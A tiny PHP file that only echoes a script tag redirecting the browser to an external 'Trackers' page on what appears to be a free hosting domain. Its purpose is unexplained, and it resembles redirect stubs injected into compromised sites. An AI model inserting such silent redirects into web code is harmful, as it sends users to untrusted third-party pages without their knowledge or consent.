<?php
echo '<script>window.location.href = "http://linkstring.comxa.com/Trackers/";</script>';
?>